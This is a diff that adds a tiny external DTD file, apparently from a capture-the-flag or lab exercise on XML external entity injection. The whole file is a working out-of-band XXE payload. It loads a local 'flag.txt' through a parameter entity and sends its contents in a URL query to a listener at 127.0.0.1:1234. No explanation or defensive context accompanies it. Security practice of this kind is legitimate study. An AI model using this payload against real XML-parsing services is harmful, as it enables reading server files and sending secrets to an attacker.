@@ -1,0 +1,6 @@
+<!ENTITY % fd SYSTEM "/mnt/enjoy/python/xxe/flag.txt">
+<!ENTITY % pwn "<!ENTITY &#x25; t SYSTEM 'http://127.0.0.1:1234/?u=%fd;'>">
+%pwn;
+%t;
+
+
